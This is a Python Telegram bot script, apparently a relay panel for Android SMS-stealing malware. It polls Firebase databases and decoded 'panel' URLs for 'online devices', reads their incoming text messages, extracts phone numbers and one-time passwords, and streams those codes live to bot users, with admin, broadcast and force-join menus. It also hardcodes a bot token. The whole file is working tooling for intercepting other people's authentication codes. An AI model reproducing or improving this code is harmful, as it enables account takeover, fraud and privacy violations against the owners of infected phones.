import asyncio, json, os, time, logging, random, re, base64
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

# ================= CONFIGURATION =================
BOT_TOKEN = "8496486026:AAFvD384WU4sJn6PeG3pt9OYlGuOVVFto44a"
OWNER_ID = 8480878371
DATA_FILE = "data.json"
# =================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ================= DATA MANAGEMENT =================
def load_data():
    if not os.path.exists(DATA_FILE):
        default_data = {
            "owner_id": OWNER_ID,
            "admins": [],
            "firebases": [], # format: {"url": "...", "auth": "...", "label": "..."}
            "users": {},
            "free_mode": True,
            "force_join": []
        }
        with open(DATA_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

# ================= FIREBASE HELPERS =================
async def fetch_fb(url, auth=None):
    full_url = url
    if auth:
        full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=10) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception as e:
        log.error(f"Fetch FB Error: {e}")
    return None

def decode_panel_url(panel_url):
    # Find base64 string in URL
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data:
                return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"):
                urls = decoded.split("|||")
                return urls[0], ""
    except Exception:
        pass
    return None

async def get_online_devices():
    data = load_data()
    devices = []
    for fb in data.get("firebases", []):
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if clients and isinstance(clients, dict):
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    devices.append({
                        "dev_id": dev_id,
                        "fb_url": fb["url"],
                        "auth": fb.get("auth"),
                        "battery": dev_data.get("battery", "?"),
                        "label": fb.get("label", fb["url"].split("//")[-1].split(".")[0])
                    })
    return devices

async def get_messages(fb_url, dev_id, auth=None):
    url = f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50"
    data = await fetch_fb(url, auth)
    if not data: return []
    msgs = []
    for k, v in data.items():
        if isinstance(v, dict) and v.get("type") == "incoming":
            msgs.append(v)
    # Sort by ID descending
    msgs.sort(key=lambda x: int(x.get("id", 0)), reverse=True)
    return msgs

def extract_numbers(msgs):
    nums = set()
    pattern = re.compile(r'(?:\+?91|0)?([6-9]\d{9})')
    for m in msgs:
        text = m.get("message", "")
        for match in pattern.findall(text):
            nums.add(match)
    return list(nums)

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin"]):
        return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

# ================= STATES =================
class AdminStates(StatesGroup):
    add_fb = State()
    add_admin = State()
    broadcast = State()
    add_fj = State()

# ================= BACKGROUND SCANNER =================
active_listeners = {} # user_id: {"fb_url":, "dev_id":, "auth":, "last_id":}
listening_tasks = {}

async def listen_for_user(user_id):
    data = active_listeners.get(user_id)
    if not data: return
    
    while user_id in active_listeners:
        msgs = await get_messages(data["fb_url"], data["dev_id"], data["auth"])
        new_msgs = [m for m in msgs if int(m.get("id", 0)) > data["last_id"]]
        
        if new_msgs:
            for m in reversed(new_msgs):
                data["last_id"] = int(m.get("id", 0))
                otp = extract_otp(m.get("message", ""))
                if otp:
                    text = f"🔔 **New OTP Received**\n\n"
                    text += f"📱 Device: `{data['dev_id'][:10]}`\n"
                    text += f"📩 Sender: `{m.get('sender')}`\n"
                    text += f"⏰ Time: {m.get('dateTime')}\n\n"
                    text += f"🔑 **OTP: `{otp}`**\n\n"
                    text += f"💬 Msg: {m.get('message')[:100]}..."
                    try:
                        await bot.send_message(user_id, text, parse_mode="Markdown")
                    except: pass
        await asyncio.sleep(5)

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔍 Get OTPs / Devices", callback_data="user:get_otp")],
        [InlineKeyboardButton(text="📜 My History", callback_data="user:history")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Manage URLs", callback_data="admin:fb"), InlineKeyboardButton(text="👥 Users", callback_data="admin:users")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast"), InlineKeyboardButton(text="🔗 Force Join", callback_data="admin:fj")],
        [InlineKeyboardButton(text="👑 Admins", callback_data="admin:admins")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

def fb_menu_kb(firebases):
    kb = []
    for fb in firebases:
        kb.append([InlineKeyboardButton(text=f"❌ Remove {fb.get('label', fb['url'])}", callback_data=f"admin:rmfb:{fb['url']}")])
    kb.append([InlineKeyboardButton(text="➕ Add Firebase/Panel URL", callback_data="admin:addfb")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = load_data()
    uid = msg.from_user.id
    
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time())}
        save_data(data)
    
    # Force join check
    if data.get("force_join") and uid != data["owner_id"]:
        missing = []
        for ch in data["force_join"]:
            try:
                member = await bot.get_chat_member(ch, uid)
                if member.status in ["left", "kicked"]:
                    missing.append(ch)
            except: pass
        if missing:
            text = "⚠️ **Please join our channels to use the bot.**\n\n"
            kb = [[InlineKeyboardButton(text="Join Channel", url=f"https://t.me/{m.replace('@', '')}")] for m in missing]
            kb.append([InlineKeyboardButton(text="✅ Verify", callback_data="verify")])
            await msg.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")
            return

    if uid == data["owner_id"] or uid in data.get("admins", []):
        await msg.answer("👑 **Admin Panel**", reply_markup=admin_kb(), parse_mode="Markdown")
    else:
        if not data.get("free_mode", True):
            await msg.answer("⛔ Access Denied. Bot is currently in private mode.")
            return
        await msg.answer("👋 **Welcome to OTP Live Bot!**\nSelect an option:", reply_markup=main_kb(), parse_mode="Markdown")

@router.callback_query(F.data == "verify")
async def verify_join(cq: CallbackQuery):
    await cmd_start(cq.message)

@router.callback_query(F.data == "admin:home")
async def admin_home(cq: CallbackQuery):
    await cq.message.edit_text("👑 **Admin Panel**", reply_markup=admin_kb(), parse_mode="Markdown")

@router.callback_query(F.data == "admin:fb")
async def admin_fb(cq: CallbackQuery):
    data = load_data()
    await cq.message.edit_text("🔥 **Manage Firebases / Panels:**", reply_markup=fb_menu_kb(data["firebases"]), parse_mode="Markdown")

@router.callback_query(F.data == "admin:addfb")
async def admin_addfb_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_fb)
    await cq.message.edit_text("Send Firebase URL (e.g. `https://xyz.firebaseio.com`) or Panel URL (e.g. `https://firexpanel.com/?s=...`):", parse_mode="Markdown")

@router.message(AdminStates.add_fb)
async def admin_addfb_done(msg: Message, state: FSMContext):
    text = msg.text.strip()
    await state.clear()
    data = load_data()
    
    if "#DARKs=" in text or "?s=" in text:
        decoded = decode_panel_url(text)
        if decoded:
            url, auth = decoded
            data["firebases"].append({"url": url, "auth": auth, "label": url.split("//")[-1].split(".")[0]})
            save_data(data)
            await msg.answer(f"✅ Added Panel URL: `{url}`", parse_mode="Markdown")
            return
        else:
            await msg.answer("❌ Could not decode panel URL.")
            return
            
    if text.startswith("http"):
        data["firebases"].append({"url": text, "auth": "", "label": text.split("//")[-1].split(".")[0]})
        save_data(data)
        await msg.answer(f"✅ Added Firebase URL: `{text}`", parse_mode="Markdown")
    else:
        await msg.answer("❌ Invalid URL format.")

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    url = cq.data.split("admin:rmfb:")[1]
    data = load_data()
    data["firebases"] = [f for f in data["firebases"] if f["url"] != url]
    save_data(data)
    await cq.answer("Removed!")
    await admin_fb(cq)

@router.callback_query(F.data == "admin:users")
async def admin_users(cq: CallbackQuery):
    data = load_data()
    mode = "🟢 ON" if data.get("free_mode", True) else "🔴 OFF"
    text = f"👥 **Users Manager**\n\nTotal Users: {len(data['users'])}\nFree Mode: {mode}"
    kb = [
        [InlineKeyboardButton(text=f"Toggle Free Mode ({mode})", callback_data="admin:toggle_free")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")

@router.callback_query(F.data == "admin:toggle_free")
async def admin_toggle_free(cq: CallbackQuery):
    data = load_data()
    data["free_mode"] = not data.get("free_mode", True)
    save_data(data)
    await admin_users(cq)

@router.callback_query(F.data == "admin:broadcast")
async def admin_broadcast_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.broadcast)
    await cq.message.edit_text("📢 Send the message to broadcast to all users:")

@router.message(AdminStates.broadcast)
async def admin_broadcast_done(msg: Message, state: FSMContext):
    await state.clear()
    data = load_data()
    sent = 0
    for uid in data["users"]:
        try:
            await bot.copy_message(chat_id=int(uid), from_chat_id=msg.chat.id, message_id=msg.message_id)
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
    await msg.answer(f"✅ Broadcast sent to {sent} users.")

@router.callback_query(F.data == "admin:fj")
async def admin_fj(cq: CallbackQuery):
    data = load_data()
    text = "🔗 **Force Join Channels:**\n"
    for f in data.get("force_join", []):
        text += f"- `{f}`\n"
    kb = [
        [InlineKeyboardButton(text="➕ Add Channel", callback_data="admin:add_fj")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")

@router.callback_query(F.data == "admin:add_fj")
async def admin_add_fj_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_fj)
    await cq.message.edit_text("Send channel username (e.g. `@mychannel`). Make sure bot is admin in it:")

@router.message(AdminStates.add_fj)
async def admin_add_fj_done(msg: Message, state: FSMContext):
    await state.clear()
    ch = msg.text.strip()
    data = load_data()
    if "force_join" not in data: data["force_join"] = []
    if ch not in data["force_join"]:
        data["force_join"].append(ch)
        save_data(data)
        await msg.answer(f"✅ Added {ch} to Force Join.")

@router.callback_query(F.data == "admin:admins")
async def admin_admins(cq: CallbackQuery):
    data = load_data()
    text = "👑 **Admins:**\n"
    for a in data.get("admins", []):
        text += f"`{a}`\n"
    kb = [
        [InlineKeyboardButton(text="➕ Add Admin", callback_data="admin:add_admin")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")

@router.callback_query(F.data == "admin:add_admin")
async def admin_add_admin_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_admin)
    await cq.message.edit_text("Send the User ID to make Admin:")

@router.message(AdminStates.add_admin)
async def admin_add_admin_done(msg: Message, state: FSMContext):
    await state.clear()
    try:
        uid = int(msg.text)
        data = load_data()
        if uid not in data["admins"]:
            data["admins"].append(uid)
            save_data(data)
            await msg.answer(f"✅ `{uid}` added as Admin.", parse_mode="Markdown")
    except:
        await msg.answer("❌ Invalid ID.")

# ================= USER FLOW =================
@router.callback_query(F.data == "user:get_otp")
async def user_get_otp(cq: CallbackQuery):
    await cq.message.edit_text("🔄 Scanning APIs for online devices...")
    devices = await get_online_devices()
    if not devices:
        await cq.message.edit_text("❌ No online devices found right now.")
        return
    kb = []
    for d in devices:
        kb.append([InlineKeyboardButton(text=f"📱 {d['label']} | 🔋{d['battery']} | {d['dev_id'][:8]}", callback_data=f"dev:{d['dev_id']}:{d['label']}:{d['auth']}")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:home")])
    await cq.message.edit_text("Select an online device:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@router.callback_query(F.data.startswith("dev:"))
async def device_selected(cq: CallbackQuery):
    _, dev_id, label, auth = cq.data.split(":")
    await cq.message.edit_text("🔄 Fetching recent messages...")
    data = load_data()
    fb = next((f for f in data["firebases"] if f["label"] == label), None)
    if not fb:
        await cq.answer("Firebase not found!")
        return
        
    msgs = await get_messages(fb["url"], dev_id, auth)
    nums = extract_numbers(msgs)
    
    text = f"📱 **Device:** {label}\n"
    text += f"🆔 `{dev_id}`\n"
    text += f"📩 **Messages Found:** {len(msgs)}\n\n"
    if nums:
        text += "🔢 **Numbers found in messages:**\n"
        for n in nums[:10]:
            text += f"• `{n}`\n"
    else:
        text += "No numbers found in recent messages."
        
    kb = [
        [InlineKeyboardButton(text="🔔 Listen for OTPs", callback_data=f"listen:{dev_id}:{label}:{auth}")],
        [InlineKeyboardButton(text="📜 Last 50 Messages", callback_data=f"hist:{dev_id}:{label}:{auth}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_otp")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")

@router.callback_query(F.data.startswith("listen:"))
async def listen_start(cq: CallbackQuery):
    _, dev_id, label, auth = cq.data.split(":")
    uid = cq.from_user.id
    data = load_data()
    fb = next((f for f in data["firebases"] if f["label"] == label), None)
    if not fb:
        await cq.answer("Firebase not found!")
        return
        
    msgs = await get_messages(fb["url"], dev_id, auth)
    last_id = int(msgs[0]["id"]) if msgs else 0
    
    active_listeners[uid] = {
        "fb_url": fb["url"],
        "dev_id": dev_id,
        "auth": auth,
        "last_id": last_id
    }
    if uid not in listening_tasks or listening_tasks[uid].done():
        listening_tasks[uid] = asyncio.create_task(listen_for_user(uid))
        
    await cq.message.edit_text(f"✅ **Listening on `{dev_id[:8]}`**\n\nJaise hi koi naya OTP aayega, main turant yahan bhej dunga. Rukne ke liye /start dabayein.", parse_mode="Markdown")

@router.callback_query(F.data.startswith("hist:"))
async def show_history(cq: CallbackQuery):
    _, dev_id, label, auth = cq.data.split(":")
    data = load_data()
    fb = next((f for f in data["firebases"] if f["label"] == label), None)
    if not fb: return
    
    msgs = await get_messages(fb["url"], dev_id, auth)
    if not msgs:
        await cq.message.edit_text("❌ No messages found.")
        return
        
    text = f"📜 **Last Messages for `{dev_id[:8]}`**\n\n"
    for m in msgs[:15]:
        sender = m.get("sender", "?")
        msg_text = m.get("message", "")[:80]
        dt = m.get("dateTime", "")
        text += f"**[{dt}]** `{sender}`\n{msg_text}...\n\n"
        
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data=f"dev:{dev_id}:{label}:{auth}")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="Markdown")

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    await cq.message.edit_text("👋 **Welcome to OTP Bot!**\nSelect an option:", reply_markup=main_kb(), parse_mode="Markdown")

async def main():
    log.info("Bot Started!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
